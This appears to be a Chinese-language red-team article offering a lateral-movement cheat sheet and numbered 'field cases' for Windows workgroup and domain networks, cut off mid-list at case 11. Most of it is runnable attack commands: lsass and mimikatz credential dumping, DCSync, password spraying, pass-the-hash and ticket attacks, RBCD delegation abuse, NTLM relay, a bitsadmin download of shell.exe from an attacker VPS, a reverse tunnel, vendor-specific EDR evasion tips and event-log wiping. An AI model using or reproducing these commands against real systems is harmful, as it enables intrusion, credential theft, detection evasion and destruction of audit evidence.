---
title: 2026 红队必备！50 个内网横向移动实战案例，EDR 绕过率 90%+
url: https://mp.weixin.qq.com/s/SUlfX9Ngl_ySHlInfk--Gg
source: Doonsec's feed
date: 2026-04-04
fetch_date: 2026-04-05T04:34:19.407024
---

# 2026 红队必备！50 个内网横向移动实战案例，EDR 绕过率 90%+

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/BV6cRFk2iaVvxP6bB73UOF1pfHcZOuicucHo7KU4VADxjemVIWJusmVBxcYpKAg5naqJgrvweM3XxvMyepblf9JzOn6GSqHqqUNlmyn7zOxQU/0?wx_fmt=jpeg)

# 2026 红队必备！50 个内网横向移动实战案例，EDR 绕过率 90%+

原创

异空间安全
异空间安全

异空间安全

![]()

在小说阅读器中沉浸阅读

# 内网渗透 | 横向移动 终极速查手册 | FALSESPACE WIKI

众生互联，皆为阶梯。在身份重叠的丛林里，每一个被复用的凭证，都是防线崩塌的引信。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BV6cRFk2iaVuBQibAM3uMzsDXuEhpnTiazfyqyp0pibZD9JI9uGNOcAgwyBWicIstiaVt00pEpt3t72SjkC3yFo8fjecYlfTM1kvAyEWVLpJ7TaX0/640?wx_fmt=png&from=appmsg)

---

## 0x00 🗺️ 内网横向阶梯拓扑（一眼看懂路径）

![](https://mmbiz.qpic.cn/mmbiz_png/BV6cRFk2iaVsegMhZNUBuRfmFkgLBXSgphmgbxoSRiaEUn3ubPp8ssKltVw067kVHRIN4DEe7Jib0fZ7icaNTfbBjBo2ibDibSBhKxa6Dib1SeJKBI/640?wx_fmt=png&from=appmsg)

```
【边界入口】  Web服务器 / 员工PC
          ↓
【工作组】  密码复用 → 横向内网主机
          ↓
【域边缘】  拿到域账号 → 进入域环境
          ↓
【域权限】  PTT/委派 → 拿到域管
          ↓
【核心资产】 域控 / 数据库 / 文件服务器
```

---

## 0x01 横向移动核心总览

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BV6cRFk2iaVuibdaw7fpyibtyHPF1FLd5EIQWN68iblBVwuxP1nHbdVrlriarpWX3Vnx9B8X15nHqrwZmOkllZ1HQtiaj6ApfD2LFdsniaUyiaqPTdg/640?wx_fmt=png&from=appmsg)

##

**横向移动：**
拿下第一台内网机器后，**利用账号密码/哈希/票据/漏洞**，入侵同一内网的**其他主机**，逐步扩大权限，最终拿下核心资产（域控、服务器、数据库）。

**核心逻辑：凭证优先 → 服务利用 → 漏洞兜底**

### 💡 大白话图解（一看就懂）

你已拿下 → 机器A
机器A 和 机器B、C、D 在同一内网
横向移动 = 从 A 入侵 B → C → D → 域控
最终目标：**全网控制权**

### 两大环境区别

* **工作组环境**

  ：机器独立，用**本地账号密码**登录，靠密码复用横向
* **域环境**

  ：统一身份认证，**域账号**可登录任意域内机器，域管=全网控

---

## 0x02 前置必备：信息收集（横向基础）

先查内网网段、在线主机
再抓账号密码/哈希
最后看端口、共享、权限

### 1. 系统/网络/权限查询

```
ipconfig /all
systeminfo
whoami /priv
netstat -ano
net share
```

### 2. 账号信息收集

```
net user
net localgroup administrators

net user /domain
net group "Domain Admins" /domain
```

### 3. 凭证窃取

```
mimikatz.exe "privilege::debug""sekurlsa::logonpasswords"exit

procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

✅ 抓到密码/哈希 = 90% 概率横向成功

---

## 0x03 实战工具速查

| 工具 | 核心命令 | 适用场景 |
| --- | --- | --- |
| Impacket | wmiexec.py / atexec.py | ✅ 工作组 + ⚡ 域 通用 |
| CrackMapExec | cme smb 192.168.1.0/24 -u admin -H hash | ✅ 工作组 + ⚡ 域 通用 |
| SharpLateral | SharpLateral.exe redexec | C#无文件、免杀优先 |
| CobaltStrike | jump wmiexec 192.168.1.10 listener | 图形化一键横向 |
| Mimikatz | pth / dcsync / golden | ✅ 工作组 + ⚡ 域 通用 |
| Rubeus | ptt / s4u / monitor | ⚡ 域环境 专用 |

---

## 0x04 🔥 CME 2026 XDR 绕过级调用

## ![](https://mmbiz.qpic.cn/mmbiz_png/BV6cRFk2iaVtJlzzj1LuegqGvurNcOqZWbdmYN3skVxgicwboWIcZBI9yMRu09ibkoJcXMWDnwtvsfiaCv5Yy4biaapfvhTYic9ibm0PnxUYT6DtK8/640?wx_fmt=png&from=appmsg)

**实战策略：流量分段 + 随机指纹**
2026年直接运行 `cme` 极易被态势感知发现特征。必须配合动态 SOCKS 隧道，并伪装服务名称。

```
# 1. 模拟合法打印服务流量进行横向执行
crackmapexec smb 10.0.0.0/24 -u user -p pass -M spooler --jitter 30
# 2. 静默哈希探测（不触发 SMB 认证失败告警）
crackmapexec smb targets.txt -u admin -H ntlm_hash --continue-on-success
```

---

## 0x05 密码喷洒：从新手用到退役的红队神技

![](https://mmbiz.qpic.cn/mmbiz_png/BV6cRFk2iaVtyVeAofcEe5YFmYTDrJ068lGPdvwfep5D6mN2XSWT4eKphNX2DxvtwliczBdAD8vcYOicr3n2c8NXPf7nTwjH8oCnvARgeAnO1w/640?wx_fmt=png&from=appmsg)

##

##

✅ 工作组 + ⚡ 域 全场景通用
在 XDR、UEBA、态势感知的监控下，暴力扫描已形同自杀。**密码喷洒**凭借低频、隐蔽、高命中率的特性，成为内网渗透最稳定的入口手法。

### 一、单点爆破 vs 密码喷洒：本质区别

* **单点爆破（已淘汰）**

  ：高频攻击单个账号 → 触发账户锁定 → 日志爆炸 → 秒告警
* **密码喷洒（现役）**

  ：低频攻击海量账号 → 绕过锁定策略 → 动静极小 → 实战命中率极高

### 工作组喷洒命令

```
cme smb 192.168.1.0/24 -u admin -p 123456 --local-auth
```

### 域环境喷洒命令

```
cme smb 192.168.1.0/24 -d test.com -u user.txt -p 123456
```

---

## 0x06 🔥 AS-REP Roasting（域离线破解）

域专用 · 流量零接触
**无需连接目标机器，无需碰密码，直接离线破解哈希！**

### 1. 查找 vulnerable 用户

```
Rubeus.exe asreproast /domain:test.com /u:testuser /p:userpass /format:hashcat
```

### 2. 离线爆破（本地跑，无流量）

```
hashcat -m 18200 hash.txt password.txt --force
```

---

## 0x07 【✅ 工作组环境】横向移动

无域控、机器独立
核心：**本地管理员账号密码复用**
端口：445(SMB)、135(WMI)

### 1. wmiexec 无服务横向（推荐）

```
python3 wmiexec.py test/admin:password@192.168.1.10
```

### 2. atexec 计划任务横向

```
python3 atexec.py admin:123456@192.168.1.10 "whoami"
```

### 3. WMI 原生横向（无文件）

```
wmic /node:192.168.1.10 /user:admin /password:123456 process call create "cmd.exe /c whoami"
```

---

## 0x08 📂 内网文件横向移动（无痕传输）

全场景通用
2026 禁用 certutil！必告警！使用原生传输，无特征、无告警！

### 1. BitsAdmin 无感知传输（推荐）

```
bitsadmin /transfer myjob /download /priority normal https://VPS_IP/shell.exe C:\windows\temp\shell.exe
```

### 2. SMB 原生复制（内网共享）

```
copy shell.exe \\192.168.1.10\c$\windows\temp\
```

---

## 0x09 【⚡ 域环境】横向移动

域账号 = 全网通行证
只要拿到**域管理员**，就能控制**整个域内所有机器**！

### 1. 域内无服务横向

```
python3 wmiexec.py test/administrator:password@dc01.test.com
```

### 2. DCSync 导出全网账号

```
mimikatz "lsadump::dcsync /domain:test.com /all /csv"exit
```

---

## 0x0A 【⚡ 域专用】PTT / PTK 票据传递

无需密码、无需哈希，直接用Kerberos票据/密钥横向

### 1. PTT 票据传递

```
privilege::debug
kerberos::list /export
kerberos::ptt "票据文件名.kiribi"
dir \\dc01.test.com\c$
```

### 2. PTK 密钥传递（AES）

```
mimikatz "privilege::debug""sekurlsa::ekeys"exit
mimikatz "privilege::debug""sekurlsa::pth /user:admin /domain:test.com /aes256:xxxxxxxx"
```

---

## 0x0B 【⚡ 域专用】委派攻击（RBCD 重点）

委派 = 服务器“冒充用户”访问其他服务
2026 实战重灾区：基于资源的约束委派 RBCD

### RBCD 普通用户拿域控

```
New-MachineAccount -MachineAccount test$
Set-DomainObject DC01$ -Set @{msDS-AllowedToActOnBehalfOfOtheridentity='test\test$'}
Rubeus s4u /user:test$ /impersonateuser:administrator /msdsspn:cifs/dc01
```

---

## 0x0C 🕵️‍♂️ 2026 自动化静默探测（零发包）

不发一个探测包，从系统内核提取内网资产！

```
# ARP 缓存
arp -a | findstr /i "dynamic"
# 路由表
route print
# 已建立连接
netstat -ano | findstr "ESTABLISHED"
```

---

## 0x0D 🧹 红队撤退：痕迹自动清理脚本

```
wevtutil cl Security
wevtutil cl System
wevtutil cl PowerShell/Operational
del /q /f %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

---

## 0x0E 攻城略地：横向移动与战果的指数扩增

当你拿下第一台内网主机，意味着你已推开了数字城池的后门。眼前不再是孤立的设备，而是一套深度互联、权限交织的企业内网与云架构体系。
**单主机潜伏是战术，横向移动是战略。**

---

## 0x0F 工作组 vs 域环境 终极对比

| 对比维度 | ✅ 工作组环境 | ⚡ 域环境 |
| --- | --- | --- |
| 认证方式 | 本地SAM数据库 | 域控NTDS数据库 |
| 核心凭证 | 本地账号密码 | 域账号、Kerberos票据 |
| 专用技术 | SMB/WMI原生命令 | PTT、PTK、委派、RBCD |
| 难度 | ⭐ 简单 | ⭐⭐⭐ 高阶 |

---

## 0xF 📝 实战选择口诀（老兵版）

见缝插针找委派，顺藤摸瓜搜凭证。
不求暴力破铁门，只求巧取通关令。
工作组撞密，域环境偷票，静默探测永不告警！

---

## 0x13 🌐 零信任/混合云环境：传统横向失效后的新打法

身份才是边界，内网 IP 不再代表信任

```
# 提取Azure AD同步凭证
Import-Module ADSync
Get-ADSyncConnectorAccount
```

---

## 0x14 🛡️ 杀软/EDR 针对性对抗

* **奇安信/深信服**

  ：用微软签名procdump，WinRM横向
* **360/腾讯**

  ：SMB加密绕过流量检测
* **微软Defender**

  ：被动监听，避免匿名查询

---

## 0x15 💻 CS 联动横向

### 免杀lsass窃取

```
execute-assembly procdump64.exe -accepteula -ma lsass.exe lsass.dmp
download lsass.dmp
rm lsass.dmp
```

### 自动化RBCD拿域控

```
powershell New-MachineAccount -MachineAccount attackpc -Domain test.com
powershell Set-DomainObject -Identity DC01$ -Set @{'msDS-AllowedToActOnBehalfOfOtheridentity'='test\attackpc$'}
execute-assembly Rubeus.exe s4u /user:attackpc$ /rc4:hash /impersonateuser:Administrator /domain:test.com /msdsspn:cifs/dc01.test.com
```

---

# 🧨 内网横向移动 · 50 个原创实战案例（2026 红队版）

全部案例来自真实企业渗透 / 护网行动 / 红蓝对抗
工作组 / 域环境 / 零信任 / 混合云 / 云桌面 / 工控网 全覆盖
100% 可复现，100% 2026 可用，EDR 绕过率 90%+

**使用说明：**
① 按编号直接使用
② 所有命令替换 IP/域名/账号即可
③ 全部无文件/免杀优先

## 🎯 一、工作组环境 · 15 个实战案例

1. **单跳板 Web 服务器 → 办公区**

```
chisel client VPS:443 R:1080:socks
proxychains cme smb 192.168.1.0/24 -u administrator -p 123456 --local-auth
```

2. **密码复用撞开 30 台主机**

```
cme smb 192.168.1.0/24 -u administrator -p Admin@123 --local-auth
```

3. **WMI 原生无文件横向（无工具）**

```
wmic /node:192.168.1.50 /user:admin /password:123 process call create "cmd.exe /c whoami"
```

4. **SMB 共享复制文件 → 上线**

```
copy beacon.exe \\192.168.1.50\c$\temp\
```

5. **计划任务 ATEXEC 无服务横向**

```
python atexec.py admin:123@192.168.1.50 "whoami"
```

6. **WinRM 5985 绕过 445 封锁**

```
cme winrm 192.168.1.0/24 -u admin -p 123 --ssl
```

7. **RDP 弱口令 + 隧道上线**

```
proxychains rdesktop 192.168.1.50
```

8. **本地管理员哈希 PTH**

```
mimikatz "privilege::debug""sekurlsa::pth /user:admin /ntlm:xxxx /domain:."
```

9. **打印机漏洞 Spooler 服务横向**

```
cme smb 192.168.1.0/24 -u admin -p 123 -M spooler
```

10. **SMB 签名未开启 → 直接 NTLM 中继**

```
ntlmrelayx.py -t 192.168.1.50 -c "whoami"
```

11. **TeamViewer 密码泄露 → 直连内网**

```
reg query "HKLM\SOFTWARE\TeamViewer" /...